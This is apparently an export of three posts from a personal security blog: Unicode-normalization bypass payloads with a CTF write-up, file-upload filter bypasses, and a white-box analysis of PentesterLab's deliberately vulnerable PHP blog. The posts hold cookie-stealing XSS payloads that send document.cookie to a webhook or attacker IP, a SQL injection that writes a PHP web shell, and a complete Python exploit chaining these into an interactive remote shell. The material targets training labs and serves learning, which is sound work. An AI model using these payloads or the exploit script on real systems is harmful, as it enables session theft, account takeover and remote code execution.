[{"content":"What is Unicode? Unicode or formally Unicode Standard is ab information technology standard for the consistent encoding, representation, and handling of text expressed in most of the world\u0026rsquo;s writing systems.\nRepresentation For example \u0026ldquo;A\u0026rdquo; is mapped to U+0041 and \u0026ldquo;a\u0026rdquo; is mapped to U+0061. Unicode characters exist from U+000000 to U+10FFFF (there are more than a million symbols). Unicode divides all these possible symbols into \u0026ldquo;planes\u0026rdquo;, the best known is the BMP (Basic Multilingual Plane) that goes from U+0000 to U+FFFF (it is the unicode plane number 1, there are 16 more, called \u0026ldquo;astral planes\u0026rdquo;).\nThe Unicode characters of the so-called \u0026ldquo;astral\u0026rdquo; planes can also be represented as \u0026ldquo;surrogate pairs\u0026rdquo; in UTF-16. Read more\n Unicode equivalence Unicode equivalence or Unicode normalization is the specification by the Unicode character encoding standard that some sequences of code points represent essentially the same character. On a more technical level, normalization ensures two strings that may use a different binary representation for their characters have the same binary value after normalization.\nCanonical Equivalence Canonical equivalent characters are assumed to have the same appearance and meaning when printed or displayed.\nCompatibility Equivalence Compatibility equivalence a weaker equivalence, in that two values may represent the same abstract character but can be displayed differently.\nNormalization algorithms There are 4 Normalization algorithms defined by the Unicode standard; NFC, NFD, NFKD and NFKD, each applies Canonical and Compatibility normalization techniques in a different way. You can read more on the different techniques at unicode.org.\n NFC: Normalization Form Canonical Composition NFD: Normalization Form Canonical Decomposition NFKC: Normalization Form Compatibility Composition NFKD: Normalization Form Compatibility Decomposition  The general idea behind all of these algorithms is to \u0026ldquo;normalize\u0026rdquo; some code-points to end up having the same character.\n What is the impact? What can we, as attackers do with unicode?\nPath traversal    Character Payload After Normalization     ‥ (U+2025) ‥/‥/‥/etc/passwd ../../../etc/passwd   ︰(U+FE30) ︰/︰/︰/etc/passwd ../../../etc/passwd     SQL Injection    Character Payload After Normalization     ＇(U+FF07) ＇ or ＇1＇=＇1 ’ or ‘1’=’1   ＂(U+FF02) ＂ or ＂1＂=＂1 ” or “1”=”1   ﹣ (U+FE63) admin＇﹣﹣ admin’–     Server-Side Request Forgery - SSRF    Character Payload After Normalization     ⓪ (U+24EA) ①②⑦.⓪.⓪.① 127.0.0.1     Open Redirect    Character Payload After Normalization     。(U+3002) lazarv。com lazarv.com   ／(U+FF0F) ／／lazarv.com //lazarv.com     Cross Site Scripting - XSS    Character Payload After Normalization     ＜(U+FF1C) ＜script src=a／＞ ＜script src=a/\u0026gt;   ＂(U+FF02) ＂onclick=＇prompt(1)＇ “onclick=’prompt(1)’     Template Injection - SSTI and CSTI    Character Payload After Normalization     ﹛(U+FE5B) ﹛﹛3+3﹜﹜ {{3+3}}   ［ (U+FF3B) ［［5+5］］ [[5+5]]     OS Command Injection    Character Payload After Normalization     ＆ (U+FF06) ＆＆whoami \u0026amp;\u0026amp;whoami   ｜ (U+FF5C) ｜｜ whoami       Arbitrary file upload     Character Payload After Normalization     ｐ (U+FF50) ʰ (U+02B0) shell.ｐʰｐ shell.php     Chain reaction writeup from DownUnderCTF 2021 Upon visiting the main page, we see an option to register or login:\nRegister whatever account and login:\nAfter logging in, we are presented with the option to visit our profile in the upper right corner of page:\nOn our profile page, we\u0026rsquo;re able to update our username and \u0026ldquo;About me\u0026rdquo; text with ability to report current page to admin:\nThis might be an opportunity to XSS the page, but after inserting \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; I get redirected to this page:\nAt this point we know that some kind of input sanitization or character black listing is being performed. After trial and error, I decided to try encoding blacklisted characters with unicode equivalents. Unicode Normalization reference table\nI intercepted the update information request in Burp Suite and successfully broke out of HTML by injecting \u0026quot;\u0026quot;\u0026gt; test in unicode format and escaped from the HTML:\nusername=lazar\u0026amp;aboutme=%ef%bc%82%ef%bc%82%ef%b9%a5 test This means that I can inject a simple cookie stealer which will send me the cookie in base64 and enable me to log in as admin when he reviews the reported page. I injected the following JavaScript PoC:\n%ef%bc%82%ef%bc%82%ef%b9%a5%ef%b9%a4scri%e1%b5%96t%ef%b9%a5 var i = new Image(); i.src=\u0026#39;https://webhook.site/MYID?\u0026#39; %2b btoa(document.cookie) %ef%b9%a4/scri%e1%b5%96t%ef%b9%a5 Which translates to:\nHere I am creating a new image element and setting its src attribute to point to an online webhook link I created and appending user\u0026rsquo;s cookie, using document.cookie function and encoding it to base64 using btoa native javascript function.\nAfter pressing \u0026ldquo;Report Error\u0026rdquo; button on the page, my webhook came with appended base64 value:\nDecoding base64 we get admin-cookie value:\nI applied the cookie to my current session by opening developer tools and executing the following:\ndocument.cookie = \u0026#34;admin-cookie=COOKIE_VALUE\u0026#34; Now we are able to access /admin endpoint which holds the flag:\n","permalink":"https://lazarpostenje.github.io/posts/unicode-normalization-vulnerabilities/","summary":"What is Unicode? Unicode or formally Unicode Standard is ab information technology standard for the consistent encoding, representation, and handling of text expressed in most of the world\u0026rsquo;s writing systems.\nRepresentation For example \u0026ldquo;A\u0026rdquo; is mapped to U+0041 and \u0026ldquo;a\u0026rdquo; is mapped to U+0061. Unicode characters exist from U+000000 to U+10FFFF (there are more than a million symbols). Unicode divides all these possible symbols into \u0026ldquo;planes\u0026rdquo;, the best known is the BMP (Basic Multilingual Plane) that goes from U+0000 to U+FFFF (it is the unicode plane number 1, there are 16 more, called \u0026ldquo;astral planes\u0026rdquo;).","title":"Unicode normalization vulnerabilities"},{"content":"Never trust the user input!\nIntroduction Uploaded files can pose a significant risk to web applications which means the security side of file upload forms must be at the maximum level. During penetration testing engagements, you may have seen unrestricted file uploads which can quickly grant you RCE, but it\u0026rsquo;s not always that easy. In some cases you have to bypass certain restrictions and trick the target application into uploading your malicious shell.\nThe impact The impact of this vulnerability is quite high, supposed code can be executed in the server context or on the client side. The likelihood of detection for the attacker is high. The prevalence is common. As a result the severity of this type of vulnerability is high.\nClient-side filters bypass What are client-side filters? They are just another security measure designed to make user experience good, although not quite secure. It involves JavaScript checking the validity of uploaded file which is handy when normal web app users make an error and upload the wrong file. On the other hand, it heavily relies on user\u0026rsquo;s browser which can be easily bypassed by intercepting the traffic.\nI won\u0026rsquo;t be explaining how to intercept traffic using Burp Suite as there are like million articles on web explaining to do so. Just google it.\n\u0026lt;script type = \u0026#34;text/javascript\u0026#34; \u0026gt; var _validFileExtensions = [\u0026#34;.jpg\u0026#34;, \u0026#34;.jpeg\u0026#34;, \u0026#34;.bmp\u0026#34;, \u0026#34;.gif\u0026#34;, \u0026#34;.png\u0026#34;]; function Validate(oForm) { var arrInputs = oForm.getElementsByTagName(\u0026#34;input\u0026#34;); for (var i = 0; i \u0026lt; arrInputs.length; i++) { var oInput = arrInputs[i]; if (oInput.type == \u0026#34;file\u0026#34;) { var sFileName = oInput.value; if (sFileName.length \u0026gt; 0) { var blnValid = false; for (var j = 0; j \u0026lt; _validFileExtensions.length; j++) { var sCurExtension = _validFileExtensions[j]; if (sFileName.substr(sFileName.length - sCurExtension.length, sCurExtension.length).to LowerCase() == sCurExtension.toLowerCase()) { blnValid = true; break; } } if (!blnValid) { alert(\u0026#34;Sorry, \u0026#34; + sFileName + \u0026#34; is invalid, allowed extensions are: \u0026#34; + _validFileExtension s.join(\u0026#34;, \u0026#34;)); return false; } } } } return true; } \u0026lt;/script\u0026gt; Example taken from exploit-db\nAs you can see from the above code snippet, JavaScript processes the input before sending anything to the server and checks if your file has the extensions of the image file (jpg, jpeg, bmp, gif, png). This is easily bypassable by just uploading the image, and changing it\u0026rsquo;s content and extension in the request using Burp Suite.\nBypassing File name validation File name validation is when the server backend checks the extension of uploaded file. This validation can be done with many methods but two of the most popular are blacklisting and whitelisting.\nBlacklisting Blacklisting file extensions is a type of protection where certain file extensions are rejected. For example, the server might only reject .php extension but allows any other.\nBlacklisting bypass techniques  Try other executable extensions Bypass case sensitive filter Idiotic Regex filter bypass Add shell to executable using .htaccess file  Try other executable extensions PHP has multiple extensions and any of these will still work:\n pht phpt phtml php1 php2 php3 php4 php5 php6 php7  Bypass case sensitive filter While uploading the shell, you can play with extension casing\nExample code:\nif($imageFileType == \u0026#34;php\u0026#34;) { echo \u0026#34;Only images are allowed.\u0026#34;; } The above code snippet can be exploited by uploading non-popular php file extensions for example:\nOr by simply changing the extension\u0026rsquo;s cases such as:\n pHp Php phP any other combination of non-popular extensions  Regex filter bypass Sometimes developers rely on regex to validate file extensions, and such cases might lead to a regex failure. If the backend checks for .jpg extensions in file name, but not at the end of it, it is vulnerable. Such cases can be bypassed with double extension like shell.jpg.php. Not quite common but worth testing for.\nWhitelisting Whitelisting is the exact opposite of blacklisting - only allowing specified file extensions to be uploaded such as jpeg, jpg, png.\nExample code:\nif($imageFileType != \u0026#34;jpg\u0026#34; \u0026amp;\u0026amp; $imageFileType != \u0026#34;png\u0026#34; \u0026amp;\u0026amp; $imageFileType != \u0026#34;jpeg\u0026#34; \u0026amp;\u0026amp; $imageFileType != \u0026#34;gif\u0026#34; ) { echo \u0026#34;Only images are allowed.\u0026#34;; } Whitelisting bypass techniques  Null byte injection Double extension bypass Invalid extension bypass  Null byte injection Sometimes backend gets confused if there\u0026rsquo;s null byte in the filename of uploaded file. In such cases, it can be exploited by uploading shell.php%00.jpg file which will be uploaded as shell.php.\nDouble extension bypass Double extension bypass involves naming files such as shell.php.png, shell.php;png or shell.php;png. If you are extremely lucky, the result might be RCE but most likely it won\u0026rsquo;t.\nInvalid extension bypass By submitting invalid extension, the underlying backend and OS could just ignore it and treat it as file name alone. For example, if we name the file shell.php.lazar it might completely ignore lazar extension because it doesn\u0026rsquo;t exist, and save it as shell.php.\n","permalink":"https://lazarpostenje.github.io/posts/bypassing-file-upload-restrictions/","summary":"Never trust the user input!\nIntroduction Uploaded files can pose a significant risk to web applications which means the security side of file upload forms must be at the maximum level. During penetration testing engagements, you may have seen unrestricted file uploads which can quickly grant you RCE, but it\u0026rsquo;s not always that easy. In some cases you have to bypass certain restrictions and trick the target application into uploading your malicious shell.","title":"Bypassing file upload restrictions"},{"content":"In today\u0026rsquo;s blog post I\u0026rsquo;ll be doing a simple source code analysis of vulnerable web blog made by PentesterLab.\nIt\u0026rsquo;s a basic PHP web app for learning white box testing, meaning that we have access to all of source code.\nAnalysis The first thing I\u0026rsquo;ll be looking into is index.php file:\n\u0026lt;?php $site = \u0026#34;PentesterLab vulnerable blog\u0026#34;; require \u0026#34;header.php\u0026#34;; $posts = Post::all(); ?\u0026gt;\u0026lt;div class=\u0026#34;block\u0026#34; id=\u0026#34;block-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;secondary-navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php foreach ($posts as $post) { echo $post-\u0026gt;render(); } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php require \u0026#34;footer.php\u0026#34;; ?\u0026gt; The header.php and footer.php files are just generic header and footer templates which have no meaning to us since they don\u0026rsquo;t have any functionality.\nNext thing I saw was $posts = Post::all(); which esentially calls all function from Post class, and assigning the result to posts variable.\nFinding all function using grep:\n$ grep -Rni \u0026#39;function all\u0026#39; --color . ./classes/comment.php:16: function all($post_id=NULL) { ./classes/post.php:13: function all($cat=NULL,$order =NULL) { grep arguments\n i - case insensitive search R - recursive search n - displays line number color - prints the found string in color  It is located in ./classes/post.php on 13th line:\nfunction all($cat=NULL,$order =NULL) { $sql = \u0026#34;SELECT * FROM posts\u0026#34;; if (isset($order)) $sql .= \u0026#34;order by \u0026#34;.mysql_real_escape_string($order); $results= mysql_query($sql); $posts = Array(); if ($results) { while ($row = mysql_fetch_assoc($results)) { $posts[] = new Post($row[\u0026#39;id\u0026#39;],$row[\u0026#39;title\u0026#39;],$row[\u0026#39;text\u0026#39;],$row[\u0026#39;published\u0026#39;]); } } else { echo mysql_error(); } return $posts; } While looking at this function, I didn\u0026rsquo;t find anything useful to exploit. Moving onto Post.php page (not class file!)\n\u0026lt;?php $site = \u0026#34;PentesterLab vulnerable blog\u0026#34;; require \u0026#34;header.php\u0026#34;; $post = Post::find(intval($_GET[\u0026#39;id\u0026#39;])); ?\u0026gt;\u0026lt;div class=\u0026#34;block\u0026#34; id=\u0026#34;block-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;secondary-navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php echo $post-\u0026gt;render_with_comments(); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;/post_comment.php?id=\u0026lt;?php echo htmlentities($_GET[\u0026#39;id\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; Title: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; / \u0026gt;\u0026lt;br/\u0026gt; Author: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;author\u0026#34; / \u0026gt;\u0026lt;br/\u0026gt; Text: \u0026lt;textarea name=\u0026#34;text\u0026#34; cols=\u0026#34;80\u0026#34; rows=\u0026#34;5\u0026#34;\u0026gt; \u0026lt;/textarea\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; / \u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php require \u0026#34;footer.php\u0026#34;; ?\u0026gt; First thing that I look for is where user input is obtained and processed. on 4th line we see a call to find function from Post class:\n$post = Post::find(intval($_GET[\u0026#39;id\u0026#39;])); One argument is being passed to find function, which is actually id parameter from GET request. Although, it is being sanitized using intval function. Looking into the function behaviour using php interpreter on my local machine:\n$ php -a Interactive mode enabled php \u0026gt; var_dump(intval(\u0026#34;hello\u0026#34;)); int(0) php \u0026gt; var_dump(intval(\u0026#34;5\u0026#34;)); int(5) php \u0026gt; var_dump(intval(\u0026#34;5hello\u0026#34;)); int(5) As you can see, intval returns 0 when anything other than integer is passed to it which means the input is properly sanitized.\nLooking into find function from Post class:\nfunction find($id) { $result = mysql_query(\u0026#34;SELECT * FROM posts where id=\u0026#34;.$id); $row = mysql_fetch_assoc($result); if (isset($row)){ $post = new Post($row[\u0026#39;id\u0026#39;],$row[\u0026#39;title\u0026#39;],$row[\u0026#39;text\u0026#39;],$row[\u0026#39;published\u0026#39;]); } return $post; } The id variable is direcly passed into query, which means if previous sanitization of input didn\u0026rsquo;t exist, we could\u0026rsquo;ve achieved SQL Injection.\nThe post_comment.php file \u0026lt;?php $site = \u0026#34;PentesterLab vulnerable blog\u0026#34;; require \u0026#34;header.php\u0026#34;; $post = Post::find(intval($_GET[\u0026#39;id\u0026#39;])); if (isset($post)) { $ret = $post-\u0026gt;add_comment(); } header(\u0026#34;Location: post.php?id=\u0026#34;.intval($_GET[\u0026#39;id\u0026#39;])); die(); ?\u0026gt;This file also uses intval function to sanitize it\u0026rsquo;s id GET parameter.\nHowever, it checks if post variable is set, and if so, it executes add_comment function\nfunction add_comment() { $sql = \u0026#34;INSERT INTO comments (title,author, text, post_id) values (\u0026#39;\u0026#34;; $sql .= mysql_real_escape_string($_POST[\u0026#34;title\u0026#34;]).\u0026#34;\u0026#39;,\u0026#39;\u0026#34;; $sql .= mysql_real_escape_string($_POST[\u0026#34;author\u0026#34;]).\u0026#34;\u0026#39;,\u0026#39;\u0026#34;; $sql .= mysql_real_escape_string($_POST[\u0026#34;text\u0026#34;]).\u0026#34;\u0026#39;,\u0026#34;; $sql .= intval($this-\u0026gt;id).\u0026#34;)\u0026#34;; $result = mysql_query($sql); echo mysql_error(); } Looking at the code above, we see that values from POST request are being directly stored into the database without any escaping or encoding.\nThis may be insecure if DB data is being printed on the page without htmlentities or similar encoding.\nLooking back at post.php file, we saw render_with_comments function being called. Looking at the function:\nfunction render_with_comments() { $str = \u0026#34;\u0026lt;h2 class=\\\u0026#34;title\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;/post.php?id=\u0026#34;.h($this-\u0026gt;id).\u0026#34;\\\u0026#34;\u0026gt;\u0026#34;.h($this-\u0026gt;title).\u0026#34;\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt;\u0026#34;; $str.= \u0026#39;\u0026lt;div class=\u0026#34;inner\u0026#34; style=\u0026#34;padding-left: 40px;\u0026#34;\u0026gt;\u0026#39;; $str.= \u0026#34;\u0026lt;p\u0026gt;\u0026#34;.htmlentities($this-\u0026gt;text).\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;\u0026#34;; $str.= \u0026#34;\\n\\n\u0026lt;div class=\u0026#39;comments\u0026#39;\u0026gt;\u0026lt;h3\u0026gt;Comments: \u0026lt;/h3\u0026gt;\\n\u0026lt;ul\u0026gt;\u0026#34;; foreach ($this-\u0026gt;get_comments() as $comment) { $str.= \u0026#34;\\n\\t\u0026lt;li\u0026gt;\u0026#34;.$comment-\u0026gt;text.\u0026#34;\u0026lt;/li\u0026gt;\u0026#34;; } $str.= \u0026#34;\\n\u0026lt;/ul\u0026gt;\u0026lt;/div\u0026gt;\u0026#34;; return $str; } We see that the post text is properly encoded using htmlentities but the comment text is not:\nforeach ($this-\u0026gt;get_comments() as $comment) { $str.= \u0026#34;\\n\\t\u0026lt;li\u0026gt;\u0026#34;.$comment-\u0026gt;text.\u0026#34;\u0026lt;/li\u0026gt;\u0026#34;; } The value of text is being directly printed without any encoding or filtering, which most likely means we can achieve Stored XSS.\nThe payload used in comment text field is:\n\u0026lt;img src=x onerror=alert()\u0026gt; Exfiltrating admin cookie The payload that I am going to use is:\n\u0026lt;script\u0026gt;var i = new Image(); i.src = \u0026#39;http://192.168.138.137/\u0026#39; + escape(document.cookie)\u0026lt;/script\u0026gt; This payload will generate an image, and set its src attribute to point to my IP address on port 80, where I am listening with python3 http.server module.\n$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 192.168.138.143 - - [28/Jul/2021 21:26:01] code 404, message File not found 192.168.138.143 - - [28/Jul/2021 21:26:01] \u0026#34;GET /PHPSESSID%3D8h8kt46prtmfkul3q3u3tbqaf3 HTTP/1.1\u0026#34; 404 - Using the above cookie, I was able to log in as admin.\nFinding RCE The admin can execute CRUD (Create, Read, Update, Delete) operations on the blog which involves a lot of communication with the database. Let\u0026rsquo;s check some functionalities out:\nLooking at file edit.php:\n\u0026lt;?php require(\u0026#34;../classes/auth.php\u0026#34;); require(\u0026#34;header.php\u0026#34;); require(\u0026#34;../classes/db.php\u0026#34;); require(\u0026#34;../classes/phpfix.php\u0026#34;); require(\u0026#34;../classes/post.php\u0026#34;); $post = Post::find($_GET[\u0026#39;id\u0026#39;]); if (isset($_POST[\u0026#39;title\u0026#39;])) { $post-\u0026gt;update($_POST[\u0026#39;title\u0026#39;], $_POST[\u0026#39;text\u0026#39;]); } ?\u0026gt;\u0026lt;form action=\u0026#34;edit.php?id=\u0026lt;?php echo htmlentities($_GET[\u0026#39;id\u0026#39;]);?\u0026gt;\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; Title: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; value=\u0026#34;\u0026lt;?php echo htmlentities($post-\u0026gt;title); ?\u0026gt;\u0026#34; /\u0026gt; \u0026lt;br/\u0026gt; Text: \u0026lt;textarea name=\u0026#34;text\u0026#34; cols=\u0026#34;80\u0026#34; rows=\u0026#34;5\u0026#34;\u0026gt; \u0026lt;?php echo htmlentities($post-\u0026gt;text); ?\u0026gt; \u0026lt;/textarea\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;Update\u0026#34; value=\u0026#34;Update\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php require(\u0026#34;footer.php\u0026#34;); ?\u0026gt; I immediately saw that this time find function parameter was not using intval like previous function calls did. As we found out earlier, the function itself directly embeds the id variable into the query, which means we can achieve SQL Injection.\nUploading shell with SQL Injection The payload I used to upload PHP shell is:\n/admin/edit.php?id=1 union select 1,\u0026#34;\u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34;,3,4 into outfile \u0026#34;/var/www/css/shell.php\u0026#34; -- - Since the root directory of webserver was not writable, which I found out during trial and error, I had to upload the shell to css directory to get it working.\nAnd we got the RCE\nDeveloping Proof of Concept First things first, let\u0026rsquo;s import some of the libraries which we\u0026rsquo;ll likely going to use:\nimport requests import re import socket import sys Setting variables and wirting an usage message:\nr = requests.Session() if len(sys.argv) \u0026lt; 3: print(\u0026#34;Usage: ./\u0026#34; + sys.argv[0] + \u0026#34; [http://target] [your IP] [port to listen on]\u0026#34;) sys.exit() target = sys.argv[1] attacker = sys.argv[2] The exploit function generates the JavaScript XSS payload which will create a new image, set it\u0026rsquo;s src attribute to attacker\u0026rsquo;s IP address on the port where the script will listen on.\ndef exploit(): port = int(sys.argv[3]) payload = ( \u0026#34;\u0026lt;script\u0026gt;var i = new Image(); i.src = \u0026#39;http://\u0026#34; + attacker + \u0026#34;:\u0026#34; + str(port) + \u0026#34;/\u0026#39; + escape(document.cookie)\u0026lt;/script\u0026gt;\u0026#34; ) print(\u0026#34;[+] Submitting XSS\u0026#34;) send(payload, port) After generating XSS payload, it\u0026rsquo;ll call send function:\ndef send(xss, port): url = target + \u0026#34;post_comment.php?id=1\u0026#34; data = {\u0026#34;title\u0026#34;: \u0026#34;Hello world!\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;Lazar\u0026#34;, \u0026#34;text\u0026#34;: xss, \u0026#34;submit\u0026#34;: \u0026#34;Submit\u0026#34;} out = r.post(url, data=data) if out.status_code == 200: print(\u0026#34;[+] Payload sent successfully!\u0026#34;) print(\u0026#34;[*] Waiting for victim...\u0026#34;) cookie = listen(port) login(cookie) This function submits a comment with XSS payload by making POST request to post_comment.php file.\nNext thing is to capture the admin\u0026rsquo;s cookie which we\u0026rsquo;ll do by starting a web server using listen function:\ndef listen(port): HOST = \u0026#34;\u0026#34; with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((HOST, port)) s.listen(1) conn, addr = s.accept() with conn: m = conn.recv(2048) print(\u0026#34;[+] Capturing cookies...\u0026#34;) out = re.findall(\u0026#34;PHPSESSID\\%3D.*HTTP\u0026#34;, m.decode(\u0026#34;utf-8\u0026#34;)) out = out[0].replace(\u0026#34;PHPSESSID%3D\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;HTTP\u0026#34;, \u0026#34;\u0026#34;) return out.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;\\t\u0026#34;, \u0026#34;\u0026#34;) This function will create simple HTTP server and, using some regex will filter out the PHPSESSID cookie.\nLogin function will log in as admin, using the previously captured cookie:\ndef login(cookie): url = target + \u0026#34;admin/index.php\u0026#34; cookie = \u0026#34;PHPSESSID={}\u0026#34;.format(cookie) head = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.5\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;, \u0026#34;Cookie\u0026#34;: cookie, } a = r.get(url, headers=head) if a.text.find(\u0026#34;Administration of my Blog\u0026#34;): print(\u0026#34;[+] Login Successful\u0026#34;) upload(r, head) else: print(\u0026#34;[-] Login Failed\u0026#34;) sys.exit() Uploading the shell using upload function:\ndef upload(r, head): url = (target + \u0026#39;admin/edit.php?id=-1%20union%20select%20\u0026#34;\u0026lt;?php\u0026#34;,\u0026#34;system($_GET[%27cmd%27]);\u0026#34;,\u0026#34;?\u0026gt;\u0026#34;,\u0026#34;;\u0026#34;%20into%20outfile%20\u0026#34;/var/www/css/shell.php\u0026#34;%23\u0026#39;) r.get(url, headers=head) shell_url = url + \u0026#34;css/shell.php\u0026#34; test = r.get(shell_url, headers=head) if test.text.find(\u0026#34;Notice: Undefined index:\u0026#34;): print(\u0026#34;[+] Shell uploaded\u0026#34;) interact(r, head) else: print(\u0026#34;[-] Shell upload failed\u0026#34;) sys.exit() Interacting with shell using interact function:\ndef interact(r, head): shell_url = target + \u0026#34;css/shell.php\u0026#34; while True: cmd = input(\u0026#34;$ \u0026#34;) if cmd == \u0026#34;exit\u0026#34;: url = shell_url + \u0026#34;?c=rm shell.php\u0026#34; r.get(url) sys.exit() else: url = shell_url + \u0026#34;?cmd={}\u0026#34;.format(cmd) print(r.get(url, headers=head).text.replace(\u0026#34;;\u0026#34;, \u0026#34;\u0026#34;)) The complete PoC:\n#!/usr/bin/env python3 import requests import re import socket import sys r = requests.Session() if len(sys.argv) \u0026lt; 3: print(\u0026#34;Usage: ./\u0026#34; + sys.argv[0] + \u0026#34; [http://target] [your IP] [port to listen on]\u0026#34;) sys.exit() target = sys.argv[1] attacker = sys.argv[2] def exploit(): port = int(sys.argv[3]) payload = ( \u0026#34;\u0026lt;script\u0026gt;var i = new Image(); i.src = \u0026#39;http://\u0026#34; + attacker + \u0026#34;:\u0026#34; + str(port) + \u0026#34;/\u0026#39; + escape(document.cookie)\u0026lt;/script\u0026gt;\u0026#34; ) print(\u0026#34;[+] Submitting XSS\u0026#34;) send(payload, port) def listen(port): HOST = \u0026#34;\u0026#34; with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((HOST, port)) s.listen(1) conn, addr = s.accept() with conn: m = conn.recv(2048) print(\u0026#34;[+] Capturing cookies...\u0026#34;) out = re.findall(\u0026#34;PHPSESSID\\%3D.*HTTP\u0026#34;, m.decode(\u0026#34;utf-8\u0026#34;)) out = out[0].replace(\u0026#34;PHPSESSID%3D\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;HTTP\u0026#34;, \u0026#34;\u0026#34;) return out.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;\\t\u0026#34;, \u0026#34;\u0026#34;) def send(xss, port): url = target + \u0026#34;post_comment.php?id=1\u0026#34; data = {\u0026#34;title\u0026#34;: \u0026#34;Hello world!\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;Lazar\u0026#34;, \u0026#34;text\u0026#34;: xss, \u0026#34;submit\u0026#34;: \u0026#34;Submit\u0026#34;} out = r.post(url, data=data) if out.status_code == 200: print(\u0026#34;[+] Payload sent successfully!\u0026#34;) print(\u0026#34;[*] Waiting for victim...\u0026#34;) cookie = listen(port) login(cookie) def login(cookie): url = target + \u0026#34;admin/index.php\u0026#34; cookie = \u0026#34;PHPSESSID={}\u0026#34;.format(cookie) head = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.5\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;, \u0026#34;Cookie\u0026#34;: cookie, } a = r.get(url, headers=head) if a.text.find(\u0026#34;Administration of my Blog\u0026#34;): print(\u0026#34;[+] Login Successful\u0026#34;) upload(r, head) else: print(\u0026#34;[-] Login Failed\u0026#34;) sys.exit() def upload(r, head): url = ( target + \u0026#39;admin/edit.php?id=-1%20union%20select%20\u0026#34;\u0026lt;?php\u0026#34;,\u0026#34;system($_GET[%27cmd%27]);\u0026#34;,\u0026#34;?\u0026gt;\u0026#34;,\u0026#34;;\u0026#34;%20into%20outfile%20\u0026#34;/var/www/css/shell.php\u0026#34;%23\u0026#39; ) r.get(url, headers=head) shell_url = url + \u0026#34;css/shell.php\u0026#34; test = r.get(shell_url, headers=head) if test.text.find(\u0026#34;Notice: Undefined index:\u0026#34;): print(\u0026#34;[+] Shell uploaded\u0026#34;) interact(r, head) else: print(\u0026#34;[-] Shell upload failed\u0026#34;) sys.exit() def interact(r, head): shell_url = target + \u0026#34;css/shell.php\u0026#34; while True: cmd = input(\u0026#34;$ \u0026#34;) if cmd == \u0026#34;exit\u0026#34;: url = shell_url + \u0026#34;?c=rm shell.php\u0026#34; r.get(url) sys.exit() else: url = shell_url + \u0026#34;?cmd={}\u0026#34;.format(cmd) print(r.get(url, headers=head).text.replace(\u0026#34;;\u0026#34;, \u0026#34;\u0026#34;)) exploit() Conclusion This was a nice simple code analysis tutorial helpful to those who are just starting white box testing, like me :)\n","permalink":"https://lazarpostenje.github.io/posts/code-analysis/","summary":"In today\u0026rsquo;s blog post I\u0026rsquo;ll be doing a simple source code analysis of vulnerable web blog made by PentesterLab.\nIt\u0026rsquo;s a basic PHP web app for learning white box testing, meaning that we have access to all of source code.\nAnalysis The first thing I\u0026rsquo;ll be looking into is index.php file:\n\u0026lt;?php $site = \u0026#34;PentesterLab vulnerable blog\u0026#34;; require \u0026#34;header.php\u0026#34;; $posts = Post::all(); ?\u0026gt;\u0026lt;div class=\u0026#34;block\u0026#34; id=\u0026#34;block-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;secondary-navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php foreach ($posts as $post) { echo $post-\u0026gt;render(); } ?","title":"Simple Code 